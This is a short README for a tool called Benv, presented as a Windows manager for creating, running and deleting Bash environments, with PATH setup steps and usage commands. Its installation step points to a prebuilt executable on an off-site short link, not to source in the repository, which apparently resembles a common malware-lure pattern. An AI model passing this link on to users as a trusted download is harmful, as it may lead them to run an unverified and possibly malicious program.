![GitHub stars](https://img.shields.io/github/stars/hackernikitaHACK/Benv?style=social)
![GitHub forks](https://img.shields.io/github/forks/hackernikitaHACK/Benv?style=social)
![GitHub issues](https://img.shields.io/github/issues/hackernikitaHACK/benv?style=social)



# Benv - Windows Bash Environment Manager

Benv is a lightweight and easy-to-use program designed to manage Bash environments on Windows. With Benv, you can create, delete, and run Bash environments seamlessly using simple commands.

## Features
- Create Bash environments.
- Run Bash environments.
- Delete existing environments.
- Easy setup and configuration.

## Installation
1. Download the Benv program from [this link](https://wdho.ru/bSuN).
2. Extract the downloaded file to a preferred location on your computer.
3. Add the folder path containing the `benv.exe` to your system's PATH environment variable manually.

### How to Add to PATH
1. Right-click on "This PC" or "My Computer" and select "Properties."
2. Click on "Advanced system settings."
3. In the "System Properties" window, click on "Environment Variables."
4. Find the "Path" variable in the "System variables" section and click "Edit."
5. Click "New" and paste the path to the folder containing `benv.exe`.
6. Click "OK" to save changes.

## Usage
Open a terminal (Command Prompt or PowerShell) and use the following commands:

### Create an Environment
```bash
benv --create <env_name>
```
Example:
```bash
benv --create my_env
```

### Run Bash in the Environment
```bash
benv --bash <env_name>
```
Example:
```bash
benv --bash my_env
```

### Delete an Environment
```bash
benv --delete <env_name>
```
Example:
```bash
benv --delete my_env
```

## Contribution
Feel free to contribute to this project by submitting issues or pull requests on GitHub.

## License
This project is licensed under the MIT License.
